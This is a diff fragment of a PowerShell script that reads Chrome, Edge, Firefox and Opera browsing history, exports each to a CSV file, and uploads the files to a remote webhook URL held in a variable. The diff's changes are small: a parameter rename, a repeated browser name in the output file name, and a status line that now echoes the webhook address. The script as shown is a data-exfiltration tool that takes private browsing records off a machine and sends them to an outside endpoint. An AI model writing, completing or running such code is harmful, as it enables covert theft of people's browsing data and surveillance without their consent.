@@ -133,20 +133,20 @@ $browsers = @('chrome', 'edge', 'firefox', 'opera')
 
 foreach ($browser in $browsers) {
     $historyPath = $paths["${browser}_history"]
-    $outputFile = "$outputDir\$browser-history.csv"
+    $outputFile = "$outputDir\$browser-$browser-history.csv"
     
     if ($browser -eq 'firefox') {
         $profiles = Get-ChildItem -Path $historyPath
         foreach ($profile in $profiles) {
             Export-FirefoxHistory -historyPath $profile.FullName -outputFile $outputFile
-            Send-FileToWebhook -filePath $outputFile -webhookUrl $whuri
+            Send-FileToWebhook -filePath $outputFile -whuri $whuri
         }
     } else {
         if (Test-Path $historyPath) {
             Export-ChromeEdgeHistory -browser $browser -historyPath $historyPath -outputFile $outputFile
-            Send-FileToWebhook -filePath $outputFile -webhookUrl $whuri
+            Send-FileToWebhook -filePath $outputFile -whuri $whuri
         }
     }
 }
 
-Write-Host "History export completed. Files sent to webhook"
+Write-Host "History export completed. Files sent to webhook: $whuri"
